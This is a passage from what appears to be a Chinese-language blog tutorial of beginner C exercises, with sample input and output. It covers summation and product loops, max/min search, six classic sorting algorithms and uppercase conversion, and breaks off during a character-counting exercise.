    <content type="html"><![CDATA[<h2 id="1-加法器与累乘器"><a href="#1-加法器与累乘器" class="headerlink" title="1 加法器与累乘器"></a>1 加法器与累乘器</h2><p><strong>代码</strong></p><p>累加器</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">sum=sum+i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d.\n"</span>,sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>累乘器：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> p=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=<span class="number">100</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">p=p*i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d.\n"</span>,p);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-求最大数与最小数"><a href="#2-求最大数与最小数" class="headerlink" title="2 求最大数与最小数"></a>2 求最大数与最小数</h2><p><strong>题目描述</strong></p><p>&emsp;&emsp;输入5个数</p><p><strong>样例输入</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">21 </span><span class="number">12</span> <span class="number">5</span> <span class="number">78</span> <span class="number">485</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max:<span class="number">485</span> min:<span class="number">5</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>],<span class="built_in">max</span>,<span class="built_in">min</span>,i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">max</span>=a[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">min</span>=a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;<span class="built_in">max</span>)&#123;</span><br><span class="line">            <span class="built_in">max</span>=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;<span class="built_in">min</span>)&#123;</span><br><span class="line">            <span class="built_in">min</span>=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"max:%d min:%d\n"</span>,<span class="built_in">max</span>,<span class="built_in">min</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-排序算法"><a href="#3-排序算法" class="headerlink" title="3 排序算法"></a>3 排序算法</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p><strong>算法原理</strong></p><p>&emsp;&emsp;它重复地走访过要排序的元素列，依次比较两个相邻的元素，如果顺序（如从大到小、首字母从Z到A）错误就把他们交换过来。走访元素的工作是重复地进行直到没有相邻元素需要交换，也就是说该元素列已经排序完成。</p><p><strong>题目描述</strong></p><p>&emsp;&emsp;输入10个数，从小到大排序</p><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span> <span class="number">23</span> <span class="number">2</span> <span class="number">6</span> <span class="number">9</span> <span class="number">46</span> <span class="number">75</span> <span class="number">6</span> <span class="number">8</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> <span class="number">6</span> <span class="number">6</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span> <span class="number">15</span> <span class="number">23</span> <span class="number">46</span> <span class="number">75</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"><span class="built_in">void</span> bubleSort(<span class="built_in">int</span> a[]);</span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">    <span class="built_in">int</span> a[<span class="number">10</span>],i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        scanf(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    bubleSort(a);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        printf(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">void</span> bubleSort(<span class="built_in">int</span> a[])&#123;</span><br><span class="line">    <span class="built_in">int</span> i,j,temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span><span class="number">-1</span>;i++)&#123;    <span class="comment">//外循环为排序趟数，len个数进行len-1趟</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">10</span>-i<span class="number">-1</span>;j++)&#123;  <span class="comment">//内循环为每趟比较的次数，第i趟比较len-i次</span></span><br><span class="line">            <span class="keyword">if</span>(a[j]&gt;a[j+<span class="number">1</span>])&#123;</span><br><span class="line">                temp=a[j+<span class="number">1</span>];</span><br><span class="line">                a[j+<span class="number">1</span>]=a[j];</span><br><span class="line">                a[j]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p><strong>算法原理</strong></p><p>&emsp;&emsp;第一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。</p><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select_Sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>],i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    select_Sort(a, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select_Sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,<span class="built_in">min</span>,temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">min</span>=i;  <span class="comment">//每一趟找出最小值的下标</span></span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[<span class="built_in">min</span>])&#123;</span><br><span class="line">                <span class="built_in">min</span>=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span>!=i)&#123;</span><br><span class="line">            temp=a[<span class="built_in">min</span>];</span><br><span class="line">            a[<span class="built_in">min</span>]=a[i];</span><br><span class="line">            a[i]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p><strong>算法原理</strong></p><p>&emsp;&emsp;主要的实现思想是将数据按照一定的顺序一个一个的插入到有序的表中，最终得到的序列就是已经排序好的数据。</p><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_Sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>],i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    Insert_Sort(a, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_Sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="comment">//开始时只有第一项，有序；从第二项开始即可 </span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">        temp=*(a+i);</span><br><span class="line">        <span class="comment">//若前一项比插入的项大，则前一项后移 </span></span><br><span class="line">        <span class="keyword">for</span>(j=i;j&gt;<span class="number">0</span>&amp;&amp;*(a+j<span class="number">-1</span>)&gt;temp;j--)&#123;</span><br><span class="line">            *(a+j)=*(a+j<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(a+j)=temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><p><strong>算法原理</strong></p><p><img src="/2020/01/26/C_C++_02/20200316124035.png" alt="image-20200316124012165"></p><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shell_Sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>],i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    Shell_Sort(a, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shell_Sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> gap,i,j,k,temp;</span><br><span class="line">    <span class="comment">// 步长初始化为数组长度的一半，每次遍历后步长减半</span></span><br><span class="line">    <span class="keyword">for</span>(gap=len/<span class="number">2</span>;gap&gt;=<span class="number">1</span>;gap/=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="comment">//分组插入排序  </span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;gap;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=i+gap;j&lt;len;j+=gap)&#123;</span><br><span class="line">                temp=a[j];</span><br><span class="line">                <span class="keyword">for</span>(k=j;k&gt;j%gap&amp;&amp;a[k-gap]&gt;temp;k-=gap)&#123;</span><br><span class="line">                    a[k]=a[k-gap];</span><br><span class="line">                &#125;</span><br><span class="line">                a[k]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p><strong>算法原理</strong></p><p>&emsp;&emsp;归并排序（MERGE-SORT）是利用<strong>归并</strong>的思想实现的排序方法，该算法采用经典的<strong>分治</strong>（divide-and-conquer）策略（分治法将问题<strong>分</strong>(divide)成一些小的问题然后递归求解，而<strong>治(conquer)</strong>的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。</p><p><img src="/2020/01/26/C_C++_02/20200317120331.png" alt="img"></p><ul><li><a href="https://www.cnblogs.com/chengxiao/p/6194356.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengxiao/p/6194356.html</a></li></ul><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//合 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> sourceArr[],<span class="keyword">int</span> tempArr[], <span class="keyword">int</span> startIndex, <span class="keyword">int</span> midIndex, <span class="keyword">int</span> endIndex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = startIndex, j=midIndex+<span class="number">1</span>, k = startIndex;</span><br><span class="line">    <span class="keyword">while</span>(i!=midIndex+<span class="number">1</span> &amp;&amp; j!=endIndex+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(sourceArr[i] &gt; sourceArr[j])</span><br><span class="line">            tempArr[k++] = sourceArr[j++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tempArr[k++] = sourceArr[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i != midIndex+<span class="number">1</span>)</span><br><span class="line">        tempArr[k++] = sourceArr[i++];</span><br><span class="line">    <span class="keyword">while</span>(j != endIndex+<span class="number">1</span>)</span><br><span class="line">        tempArr[k++] = sourceArr[j++];</span><br><span class="line">    <span class="keyword">for</span>(i=startIndex; i&lt;=endIndex; i++)</span><br><span class="line">        sourceArr[i] = tempArr[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//内部使用递归</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge_Sort</span><span class="params">(<span class="keyword">int</span> sourceArr[], <span class="keyword">int</span> tempArr[], <span class="keyword">int</span> startIndex, <span class="keyword">int</span> endIndex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> midIndex;</span><br><span class="line">    <span class="keyword">if</span>(startIndex &lt; endIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        midIndex = startIndex + (endIndex-startIndex) / <span class="number">2</span>;<span class="comment">//避免溢出int</span></span><br><span class="line">        Merge_Sort(sourceArr, tempArr, startIndex, midIndex);</span><br><span class="line">        Merge_Sort(sourceArr, tempArr, midIndex+<span class="number">1</span>, endIndex);</span><br><span class="line">        Merge(sourceArr, tempArr, startIndex, midIndex, endIndex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>],b[<span class="number">10</span>],i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    Merge_Sort(a, b, <span class="number">0</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p><strong>算法原理</strong></p><p><img src="/2020/01/26/C_C++_02/20200317133846.png" alt="image-20200317133844661"></p><ul><li><a href="https://blog.51cto.com/13733462/2113397" target="_blank" rel="noopener">https://blog.51cto.com/13733462/2113397</a></li></ul><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>],i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    QuickSort(a,<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(left&gt;=right)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i=left,j=right;</span><br><span class="line">    <span class="keyword">int</span> key=a[left];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;key&lt;=a[j])&#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        a[i]=a[j];</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;key&gt;=a[i])&#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        a[j]=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    a[i]=key;</span><br><span class="line">    QuickSort(a,left,i<span class="number">-1</span>);</span><br><span class="line">    QuickSort(a,i+<span class="number">1</span>,right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-大小写字母转换"><a href="#4-大小写字母转换" class="headerlink" title="4 大小写字母转换"></a>4 大小写字母转换</h2><p><strong>样例输入</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">aBujZx</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ABUJZX</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">toupper</span><span class="params">(<span class="keyword">char</span> a[])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, a);</span><br><span class="line">    <span class="built_in">toupper</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">toupper</span><span class="params">(<span class="keyword">char</span> a[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(a[i]!=<span class="string">'\0'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'a'</span>&lt;=a[i]&amp;&amp;a[i]&lt;=<span class="string">'z'</span>)&#123;</span><br><span class="line">            a[i]=a[i]<span class="number">-32</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-统计字符串中的字母，数字，空格，其他个数"><a href="#5-统计字符串中的字母，数字，空格，其他个数" class="headerlink" title="5 统计字符串中的字母，数字，空格，其他个数"></a>5 统计字符串中的字母，数字，空格，其他个数</h2><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">aBcd48_@</span> <span class="number">653</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字母有： <span class="number">4</span> 个</span><br><span class="line">数字有： 